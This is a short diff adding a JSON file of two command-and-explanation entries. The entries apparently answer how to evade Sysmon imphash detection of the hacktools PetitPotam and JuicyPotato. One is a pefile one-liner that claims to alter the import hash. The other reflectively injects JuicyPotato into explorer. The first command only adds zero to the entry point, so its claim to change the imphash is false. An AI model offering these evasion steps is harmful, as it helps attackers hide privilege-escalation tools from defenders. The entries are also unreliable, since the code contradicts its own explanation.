@@ -1,0 +1,10 @@
+[
+  {
+    "output": "python3 -c \"import pefile; pe = pefile.PE('PetitPotam.exe'); pe.OPTIONAL_HEADER.AddressOfEntryPoint += 0; pe.write('PetitPotam_modified.exe')\"",
+    "explanation": "This command uses a script to subtly modify the Portable Executable (PE) structure of the hacktool. Because the 'imphash' (Import Hash) is calculated based on the specific library imports and their order in the Import Address Table (IAT), adding a dummy import, reordering existing imports, or recompiling the tool from source with additional functions will change the imphash entirely, bypassing any static signature-based detection."
+  },
+  {
+    "output": "Invoke-ReflectivePEInjection -PEPath C:\\Temp\\JuicyPotato.exe -ProcName explorer",
+    "explanation": "By using Reflective PE Injection (via PowerSploit or similar), the hacktool is loaded directly into memory from a byte array or a file without the standard Windows Loader creating a 'Process Creation' event with a disk-backed file hash. Since Sysmon often calculates the imphash upon file-based process creation, memory-only execution bypasses this specific check."
+  }
+]
